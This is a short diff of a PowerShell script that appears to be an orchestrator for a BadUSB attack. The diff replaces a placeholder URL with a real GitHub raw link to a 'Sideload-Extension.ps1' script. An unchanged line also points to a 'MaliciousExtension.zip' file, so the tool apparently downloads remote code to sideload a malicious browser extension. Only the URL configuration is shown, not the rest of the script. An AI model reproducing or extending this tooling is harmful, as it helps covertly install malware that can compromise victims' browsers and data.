@@ -5,7 +5,7 @@
 $Global:LogFile = "$env:TEMP\sideload_orchestrator_log.txt" # Make log file path global
 
 # << REPLACE THESE URLS >>
-$MainSideloadScriptUrl = "https://gist.githubusercontent.com/YOUR_USER/YOUR_GIST_ID_SIDELOAD_EXT/raw/Sideload-Extension.ps1"
+$MainSideloadScriptUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/PS_Scripts/Sideload-Extension.ps1"
 $ExtensionZipUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/MaliciousExtension.zip"
 # << END OF URLS >>
 
